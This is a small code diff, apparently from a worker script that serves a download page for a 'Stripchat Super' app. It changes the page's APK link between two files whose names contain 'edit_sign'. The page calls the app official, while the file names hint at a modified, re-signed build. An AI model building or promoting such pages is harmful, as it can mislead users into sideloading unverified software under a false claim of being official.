@@ -185,7 +185,7 @@ async function handleRequest(request) {
         <h1>Stripchat Super</h1>
         <p class="description">Experience the next level of live streaming with our official mobile app. Enhanced features, better performance, and exclusive content.</p>
         
-        <a href="/stripchat_super_en_edit_sign.apk" class="download-btn" download>
+        <a href="/stripchat_flow_edit_sign_en.apk" class="download-btn" download>
             Download Now
         </a>
 
